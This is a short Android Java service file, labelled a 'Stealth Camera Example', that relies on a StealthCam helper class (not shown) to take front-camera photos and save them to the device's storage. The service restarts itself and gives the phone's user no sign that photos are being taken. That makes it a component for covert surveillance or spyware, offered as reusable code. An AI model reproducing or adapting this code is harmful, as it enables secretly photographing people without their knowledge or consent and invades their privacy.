//Author: KeyLo99
//Stealth Camera Example

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.FileOutputStream;
import java.util.Locale;

public class CamService extends Service {
    public CamService() {}
    @Override
    public IBinder onBind(Intent intent) {
        serviceOnCreate();
        return null;
    }
    public int onStartCommand(Intent intent, int flags, int startId) {
        serviceOnCreate();
        return Service.START_STICKY;
    }
    private void serviceOnCreate(){
        StealthCam stealthCam = new StealthCam(getApplicationContext(), StealthCam.CAM_FRONT, new StealthCam.CamAction() {
            @Override
            public void onTaken(byte[] data) {
                // Do whatever you want
                try {
                    FileOutputStream fileOutputStream = new FileOutputStream(String.format(Locale.US, "/sdcard/%d.jpg", System.currentTimeMillis()));
                    fileOutputStream.write(data);
                    fileOutputStream.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
        stealthCam.takePicture();
    }
}
